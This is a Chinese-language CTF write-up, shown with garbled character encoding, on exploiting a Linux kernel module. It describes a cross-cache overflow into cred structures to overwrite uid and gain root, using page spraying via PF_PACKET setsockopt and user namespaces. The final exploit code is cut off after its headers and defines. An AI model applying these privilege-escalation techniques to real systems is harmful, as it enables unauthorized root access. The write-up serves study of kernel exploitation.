<h3 id="â‘¡-æ¼æ´åˆ©ç”¨-3"><a href="#â‘¡-æ¼æ´åˆ©ç”¨-3" class="headerlink" title="â‘¡ æ¼æ´åˆ©ç”¨"></a>â‘¡ æ¼æ´åˆ©ç”¨</h3><h4 id="Step-I-cross-cache-overflow"><a href="#Step-I-cross-cache-overflow" class="headerlink" title="Step.I - cross-cache overflow"></a>Step.I - cross-cache overflow</h4><p>ç”±äºæˆ‘ä»¬çš„æ¼æ´å¯¹è±¡ä½äºç‹¬ç«‹çš„ <code>kmem_cache</code> ä¸­ï¼Œå› æ­¤å…¶ä¸ä¼šä¸å†…æ ¸ä¸­çš„å…¶ä»–å¸¸ç”¨ç»“æ„ä½“çš„åˆ†é…æ··ç”¨ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥é€šè¿‡ slub å±‚çš„å †å–· + å †é£æ°´æ¥æº¢å‡ºåˆ°å…¶ä»–ç»“æ„ä½“æ¥è¿›è¡Œä¸‹ä¸€æ­¥åˆ©ç”¨ï¼›åŒæ—¶ç”±äº slub å¹¶ä¸ä¼šåƒ glibc çš„ptmalloc2 é‚£æ ·åœ¨æ¯ä¸ª object å¼€å¤´éƒ½æœ‰ä¸ªå­˜å‚¨æ•°æ®çš„ headerï¼Œè€Œæ˜¯å°† next æŒ‡é’ˆæ”¾åœ¨ä¸€ä¸ªéšæœºçš„ä½ç½®ï¼Œæˆ‘ä»¬å¾ˆéš¾ç›´æ¥æº¢å‡ºåˆ°ä¸‹ä¸€ä¸ª object çš„ next åŸŸï¼Œç”±äº hardened freelist çš„å­˜åœ¨å°±ç®—æˆ‘ä»¬èƒ½æº¢å‡ºåˆ°ä¸‹ä¸€ä¸ªç›¸é‚» object çš„ next åŸŸä¹Ÿæ²¡æ³•æ„é€ å‡ºä¸€ä¸ªåˆæ³•çš„æŒ‡é’ˆï¼›è€Œåœ¨æˆ‘ä»¬çš„ slub é¡µé¢ç›¸é‚»çš„é¡µé¢ä¸Šçš„æ•°æ®å¯¹æˆ‘ä»¬æ¥è¯´ä¹Ÿæ˜¯æœªçŸ¥çš„ï¼Œç›´æ¥æº¢å‡ºçš„è¯æˆ‘ä»¬å¹¶ä¸çŸ¥é“èƒ½å¤Ÿæº¢å‡ºåˆ°ä»€ä¹ˆé¡µé¢ä¸Š :ï¼ˆ</p>
<p>é‚£ä¹ˆæˆ‘ä»¬çœŸçš„å°±æ²¡æœ‰ä»»ä½•åŠæ³•äº†å—ï¼Ÿç­”æ¡ˆè‡ªç„¶æ˜¯å¦å®šçš„ï¼Œè®©æˆ‘ä»¬æŠŠç›®å…‰é‡æ–°æ”¾åˆ° slub allocator ä¸Šï¼Œå½“ freelist page å·²ç»è€—ç©ºä¸” partial é“¾è¡¨ä¹Ÿä¸ºç©ºæ—¶ï¼ˆæˆ–è€… <code>kmem_cache</code> åˆšåˆšåˆ›å»ºåè¿›è¡Œç¬¬ä¸€æ¬¡åˆ†é…æ—¶ï¼‰ï¼Œå…¶ä¼šå‘ buddy system ç”³è¯·é¡µé¢ï¼š</p>
<p><img src="https://s2.loli.net/2023/01/19/yPtXiwzVfxWH7lE.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>buddy system çš„åŸºæœ¬åŸç†å°±æ˜¯ä»¥ 2 çš„ order æ¬¡å¹‚å¼ å†…å­˜é¡µä½œä¸ºåˆ†é…ç²’åº¦ï¼Œç›¸åŒ order é—´ç©ºé—²é¡µé¢æ„æˆåŒå‘é“¾è¡¨ï¼Œå½“ä½é˜¶ order çš„é¡µé¢ä¸å¤Ÿç”¨æ—¶ä¾¿ä¼šä»é«˜é˜¶ order å–ä¸€ä»½è¿ç»­å†…å­˜é¡µæ‹†æˆä¸¤åŠï¼Œå…¶ä¸­ä¸€åŠæŒ‚å›å½“å‰è¯·æ±‚ order é“¾è¡¨ï¼Œå¦ä¸€åŠè¿”è¿˜ç»™ä¸Šå±‚è°ƒç”¨è€…ï¼›ä¸‹å›¾ä¸ºä»¥ order 2 ä¸ºä¾‹çš„ buddy system é¡µé¢åˆ†é…åŸºæœ¬åŸç†ï¼š</p>
<p><img src="https://s2.loli.net/2023/01/19/79biltjNfACIZcP.gif" srcset="/img/loading.gif" lazyload alt="page.gif"></p>
<p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼šä»æ›´é«˜é˜¶ order æ‹†åˆ†æˆçš„ä¸¤ä»½ä½é˜¶ order çš„è¿ç»­å†…å­˜é¡µ<strong>æ˜¯ç‰©ç†è¿ç»­çš„</strong>ï¼Œè‹¥å…¶ä¸­çš„ä¸€ä»½è¢«æˆ‘ä»¬çš„ <code>kmem_cache</code> å–èµ°ï¼Œè€Œå¦ä¸€ä»½è¢«ç”¨äºåˆ†é…å…¶ä»–å†…æ ¸ç»“æ„ä½“çš„ <code>kmem_cache</code> å–èµ°ï¼Œ<strong>åˆ™æˆ‘ä»¬ä¾¿æœ‰å¯èƒ½æº¢å‡ºåˆ°å…¶ä»–çš„å†…æ ¸ç»“æ„ä½“ä¸Š</strong>â€”â€”è¿™ä¾¿æ˜¯ <strong><code>cross-cache overflow</code></strong></p>
<p>å…·ä½“çš„æº¢å‡ºå¯¹è±¡ä¹Ÿå¹¶ä¸éš¾æƒ³â€”â€”6ä¸ªå­—èŠ‚åˆšå¥½è¶³å¤Ÿæˆ‘ä»¬æº¢å‡ºåˆ° <code>cred</code> ç»“æ„ä½“çš„ <code>uid</code> å­—æ®µï¼Œå®Œæˆææƒï¼Œé‚£ä¹ˆå¦‚ä½•æº¢å‡ºåˆ°æˆ‘ä»¬æƒ³è¦ææƒçš„è¿›ç¨‹çš„ cred ç»“æ„ä½“å‘¢ï¼Ÿæˆ‘ä»¬åªéœ€è¦å…ˆ fork() å †å–· cred è€—å°½ <code>cred_jar </code> ä¸­ objectï¼Œè®©å…¶å‘ buddy system è¯·æ±‚æ–°çš„é¡µé¢å³å¯ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å…ˆå †å–·æ¶ˆè€— buddy system ä¸­åŸæœ‰çš„é¡µé¢ï¼Œä¹‹åæˆ‘ä»¬å†åˆ†é… cred å’Œé¢˜ç›® objectï¼Œä¸¤è€…ä¾¿æœ‰è¾ƒå¤§æ¦‚ç‡ç›¸é‚»</p>
<p><code>cred</code> çš„å¤§å°ä¸º <code>192</code>ï¼Œ<code>cred_jar</code> å‘ buddy system å•æ¬¡è¯·æ±‚çš„é¡µé¢æ•°é‡ä¸º 1ï¼Œè¶³å¤Ÿåˆ†é… 21 ä¸ª credï¼Œå› æ­¤æˆ‘ä»¬ä¸éœ€è¦å †å–·å¤ªå¤š <code>cred</code> ä¾¿èƒ½è€—å°½ <code>cred_jar</code>ï¼Œä¸è¿‡ <code>fork()</code> åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¼šäº§ç”Ÿå¾ˆå¤šçš„â€å™ªå£°â€œï¼ˆå³é¢å¤–åˆ†é…ä¸€äº›æˆ‘ä»¬ä¸éœ€è¦çš„ç»“æ„ä½“ï¼Œä»è€Œå½±å“é¡µå¸ƒå±€ï¼‰ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬æ”¹ç”¨ <code>clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND)</code></p>
<blockquote>
<p>å…³äºâ€å™ªå£°â€œé—®é¢˜å‚è§ <a target="_blank" rel="noopener" href="https://bsauce.github.io/2022/11/07/castaways/#2-3-fork%E5%99%AA%E5%A3%B0%E9%97%AE%E9%A2%98">bsauce å¸ˆå‚…çš„åšå®¢</a>ï¼Œç¬”è€…æš‚æœªæ·±å…¥é˜…è¯»è¿‡ <code>fork()</code> ç›¸å…³æºç </p>
</blockquote>
<p>ç¬”è€…åŸæœ¬æƒ³ç”¨ <code>msg_msg</code> æ¥å †å–·æ¶ˆè€— buddy systemï¼Œä½†æ˜¯ç¬”è€…å‘ç° System V çš„æ¶ˆæ¯é˜Ÿåˆ—åœ¨é¢˜ç›®ç¯å¢ƒä¸­è¢«ç¦ç”¨äº†ï¼š(</p>
<p><img src="https://s2.loli.net/2023/01/20/QHIxgOPmYnaplyj.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>å› æ­¤æˆ‘ä»¬æœ€å¥½å¯»æ‰¾ä¸€äº›ä¼š<strong>ç›´æ¥è°ƒç”¨å‘ buddy system è¯·æ±‚é¡µé¢çš„ API çš„ç»“æ„</strong>ï¼ŒåŸæœ¬ç¬”è€…æƒ³ç”¨  <code>mmap()</code>  ï¼Œä½†æ˜¯åé¢å‘ç° <code>mmap()</code> åœ¨åˆ†é…æ—¶ä¼šäº§ç”Ÿå¤§é‡å™ªå£°ï¼ˆå„ç§æ— å…³ç»“æ„ä½“ä¸é¡µé¢è¯·æ±‚ï¼ˆå¦‚é¡µè¡¨é¡¹ï¼‰ï¼‰ï¼Œæ•…åªèƒ½å¯»æ‰¾å…¶ä»–ç»“æ„ä½“</p>
<p>è¿™é‡Œç¬”è€…é€‰æ‹©å‚ç…§å®˜æ–¹ writeup ä¸­å‚ç…§ D3v17 åœ¨ <a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html">CVE-2017-7308</a> ä¸­ä½¿ç”¨ <code>setsockopt()</code> è¿›è¡Œé¡µå–·å°„çš„æ–¹æ³•ï¼šå½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ª protocol ä¸º <code>PF_PACKET</code> çš„ socket ä¹‹åï¼Œå…ˆè°ƒç”¨ <code>setsockopt()</code> å°† <code>PACKET_VERSION</code> è®¾ä¸º  <code>TPACKET_V1 </code>&#x2F; <code>TPACKET_V2</code>ï¼Œå†è°ƒç”¨ <code>setsockopt()</code> æäº¤ä¸€ä¸ª <code>PACKET_TX_RING</code> ï¼Œæ­¤æ—¶ä¾¿å­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">__sys_setsockopt()<br>    sock-&gt;ops-&gt;setsockopt()<br>    	packet_setsockopt() <span class="hljs-comment">// case PACKET_TX_RING â†“</span><br>    		packet_set_ring()<br>    			alloc_pg_vec()<br></code></pre></td></tr></table></figure>

<p>åœ¨ <code>alloc_pg_vec()</code> ä¸­ä¼šåˆ›å»ºä¸€ä¸ª <code>pgv</code> ç»“æ„ä½“ï¼Œç”¨ä»¥åˆ†é… <code>tp_block_nr</code> ä»½ 2<sup>order</sup> å¼ å†…å­˜é¡µï¼Œå…¶ä¸­ <code>order</code> ç”± <code>tp_block_size</code> å†³å®šï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> pgv *<span class="hljs-title function_">alloc_pg_vec</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tpacket_req *req, <span class="hljs-type">int</span> order)</span><br>&#123;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block_nr = req-&gt;tp_block_nr;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv</span> *<span class="hljs-title">pg_vec</span>;</span><br>	<span class="hljs-type">int</span> i;<br><br>	pg_vec = kcalloc(block_nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pgv), GFP_KERNEL | __GFP_NOWARN);<br>	<span class="hljs-keyword">if</span> (unlikely(!pg_vec))<br>		<span class="hljs-keyword">goto</span> out;<br><br>	<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; block_nr; i++) &#123;<br>		pg_vec[i].buffer = alloc_one_pg_vec_page(order);<br>		<span class="hljs-keyword">if</span> (unlikely(!pg_vec[i].buffer))<br>			<span class="hljs-keyword">goto</span> out_free_pgvec;<br>	&#125;<br><br>out:<br>	<span class="hljs-keyword">return</span> pg_vec;<br><br>out_free_pgvec:<br>	free_pg_vec(pg_vec, order, block_nr);<br>	pg_vec = <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-keyword">goto</span> out;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>åœ¨ <code>alloc_one_pg_vec_page()</code> ä¸­ä¼šç›´æ¥è°ƒç”¨ <code>__get_free_pages()</code> å‘ buddy system è¯·æ±‚å†…å­˜é¡µï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¯¥å‡½æ•°è¿›è¡Œå¤§é‡çš„é¡µé¢è¯·æ±‚ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">alloc_one_pg_vec_page</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> order)</span><br>&#123;<br>	<span class="hljs-type">char</span> *buffer;<br>	<span class="hljs-type">gfp_t</span> gfp_flags = GFP_KERNEL | __GFP_COMP |<br>			  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;<br><br>	buffer = (<span class="hljs-type">char</span> *) __get_free_pages(gfp_flags, order);<br>	<span class="hljs-keyword">if</span> (buffer)<br>		<span class="hljs-keyword">return</span> buffer;<br>	<span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>pgv</code> ä¸­çš„é¡µé¢ä¼šåœ¨ socket è¢«å…³é—­åé‡Šæ”¾ï¼Œè¿™ä¹Ÿæ–¹ä¾¿æˆ‘ä»¬åç»­çš„é¡µçº§å †é£æ°´ï¼Œä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ä½æƒé™ç”¨æˆ·æ— æ³•ä½¿ç”¨è¯¥å‡½æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡å¼€è¾Ÿæ–°çš„å‘½åç©ºé—´æ¥ç»•è¿‡è¯¥é™åˆ¶</p>
<p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯<strong>æˆ‘ä»¬ææƒçš„è¿›ç¨‹ä¸åº”å½“å’Œé¡µå–·å°„çš„è¿›ç¨‹åœ¨åŒä¸€å‘½åç©ºé—´å†…</strong>ï¼Œå› ä¸ºåè€…éœ€è¦å¼€è¾Ÿæ–°çš„å‘½åç©ºé—´ï¼Œè€Œæˆ‘ä»¬åº”å½“åœ¨åŸæœ¬çš„å‘½åç©ºé—´å®Œæˆææƒï¼Œå› æ­¤è¿™é‡Œç¬”è€…é€‰æ‹©æ–°å¼€ä¸€ä¸ªè¿›ç¨‹è¿›è¡Œé¡µå–·å°„ï¼Œå¹¶ä½¿ç”¨ç®¡é“åœ¨ä¸»è¿›ç¨‹ä¸å–·å°„è¿›ç¨‹é—´é€šä¿¡</p>
<blockquote>
<p>å¦‚æœä½ å¿˜äº†è¿™ä¸€æ­¥ï¼Œå°±ä¼šå’Œç¬”è€…ä¸€æ ·å¾—åˆ°ä¸€ä¸ª <code>65534</code> çš„ uid ç„¶åå†¥æ€è‹¦æƒ³åŠå¤©â€¦</p>
</blockquote>
<h4 id="Step-II-page-level-heap-fengshui"><a href="#Step-II-page-level-heap-fengshui" class="headerlink" title="Step.II - page-level heap fengshui"></a>Step.II - page-level heap fengshui</h4><p> <code>setsockopt()</code>  ä¹Ÿå¯ä»¥å¸®åŠ©æˆ‘ä»¬å®Œæˆ<strong>é¡µçº§å †é£æ°´</strong>ï¼Œå½“æˆ‘ä»¬è€—å°½ buddy system ä¸­çš„ low order pages åï¼Œæˆ‘ä»¬å†è¯·æ±‚çš„é¡µé¢ä¾¿éƒ½æ˜¯ç‰©ç†è¿ç»­çš„ï¼Œå› æ­¤æ­¤æ—¶æˆ‘ä»¬å†è¿›è¡Œ  <code>setsockopt()</code>  ä¾¿<strong>ç›¸å½“äºè·å–åˆ°äº†ä¸€å—è¿‘ä¹ç‰©ç†è¿ç»­çš„å†…å­˜</strong>ï¼ˆä¸ºä»€ä¹ˆæ˜¯â€è¿‘ä¹è¿ç»­â€œæ˜¯å› ä¸ºå¤§é‡çš„ <code>setsockopt()</code> æµç¨‹ä¸­åŒæ ·ä¼šåˆ†é…å¤§é‡æˆ‘ä»¬ä¸éœ€è¦çš„ç»“æ„ä½“ï¼Œä»è€Œæ¶ˆè€— buddy system çš„éƒ¨åˆ†é¡µé¢ï¼‰</p>
<p>æœ¬é¢˜ç¯å¢ƒä¸­é¢˜ç›®çš„ <code>kmem_cache</code> å•æ¬¡ä¼šå‘ buddy system è¯·æ±‚ä¸€å¼ å†…å­˜é¡µï¼Œè€Œç”±äº buddy system éµå¾ª LIFOï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ï¼š</p>
<ul>
<li>å…ˆåˆ†é…å¤§é‡çš„å•å¼ å†…å­˜é¡µï¼Œè€—å°½ buddy ä¸­çš„ low-order pages</li>
<li>é—´éš”ä¸€å¼ å†…å­˜é¡µé‡Šæ”¾æ‰éƒ¨åˆ†å•å¼ å†…å­˜é¡µï¼Œä¹‹åå †å–· credï¼Œè¿™æ ·ä¾¿æœ‰å‡ ç‡è·å–åˆ°æˆ‘ä»¬é‡Šæ”¾çš„å•å¼ å†…å­˜é¡µ</li>
<li>é‡Šæ”¾æ‰ä¹‹å‰çš„é—´éš”å†…å­˜é¡µï¼Œè°ƒç”¨æ¼æ´å‡½æ•°åˆ†é…å †å—ï¼Œè¿™æ ·ä¾¿æœ‰å‡ ç‡è·å–åˆ°æˆ‘ä»¬é‡Šæ”¾çš„é—´éš”å†…å­˜é¡µ</li>
<li>åˆ©ç”¨æ¨¡å—ä¸­æ¼æ´è¿›è¡Œè¶Šç•Œå†™ï¼Œç¯¡æ”¹ <code>cred-&gt;uid</code> ï¼Œå®Œæˆææƒ</li>
</ul>
<p>æˆ‘ä»¬çš„å­è¿›ç¨‹éœ€è¦è½®è¯¢ç­‰å¾…è‡ªå·±çš„ uid å˜ä¸º rootï¼Œä½†æ˜¯è¿™ç§åšæ³•å¹¶ä¸ä¼˜é›…ï¼š) ï¼Œæ‰€ä»¥ç¬”è€…è¿™é‡Œé€‰æ‹©ç”¨ä¸€ä¸ªæ–°çš„ç®¡é“åœ¨ä¸»è¿›ç¨‹ä¸å­è¿›ç¨‹é—´é€šä¿¡ï¼Œå½“å­è¿›ç¨‹ä»ç®¡é“ä¸­è¯»å‡º1å­—èŠ‚æ—¶ä¾¿å¼€å§‹æ£€æŸ¥è‡ªå·±æ˜¯å¦æˆåŠŸææƒï¼Œè‹¥æœªææƒåˆ™ç›´æ¥ sleep å³å¯</p>
<h3 id="â‘¢-FINAL-EXPLOIT-3"><a href="#â‘¢-FINAL-EXPLOIT-3" class="headerlink" title="â‘¢ FINAL EXPLOIT"></a>â‘¢ FINAL EXPLOIT</h3><p>æœ€åçš„ exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_PAGE_NUM 1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_CRED_START (PGV_PAGE_NUM / 2)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_SPRAY_NUM 514</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACKET_VERSION 10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACKET_TX_RING 13</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VUL_OBJ_NUM 400</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VUL_OBJ_SIZE 512</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VUL_OBJ_PER_SLUB 8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VUL_OBJ_SLUB_NUM (VUL_OBJ_NUM / VUL_OBJ_PER_SLUB)</span><br><br><span class="hljs-class"><span 